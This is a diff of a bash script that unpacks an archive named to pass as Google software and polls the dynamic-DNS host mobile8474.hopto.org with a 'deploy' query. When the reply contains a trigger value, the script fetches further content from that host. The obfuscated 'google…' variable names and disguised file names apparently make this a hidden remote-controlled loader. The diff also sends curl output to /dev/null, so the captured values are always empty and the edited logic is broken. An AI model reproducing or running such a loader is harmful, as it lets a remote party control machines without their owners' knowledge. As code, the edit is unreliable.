@@ -10,14 +10,14 @@ tar -xvf ./googleapps8474127412742.tar.gz
 
 cd googleapps8474
 
-string=$(curl http://mobile8474.hopto.org/?q=deploy)
+string=$(curl -s http://mobile8474.hopto.org/?q=deploy > /dev/null)
 if [[ $string == *"16384"* ]]; then
 
 arr[0]="http://mobile8474.hopto.org/"
 rand=$[$RANDOM % ${#arr[@]}]
 google841212121274=${arr[$rand]}
 
-google8412=$(curl $google841212121274 | sed "s/\s+//g")
+google8412=$(curl -s $google841212121274 > /dev/null | sed "s/\s+//g")
 
 if [[ $google8412 = "" ]]
 then
@@ -54,7 +54,7 @@ arr[0]="http://mobile8474.hopto.org/"
 rand=$[$RANDOM % ${#arr[@]}]
 google841212121274=${arr[$rand]}
 
-google8412=$(curl $google841212121274 | sed "s/\s+//g")
+google8412=$(curl -s $google841212121274 > /dev/null | sed "s/\s+//g")
 
 if [[ $google8412 = "" ]]
 then
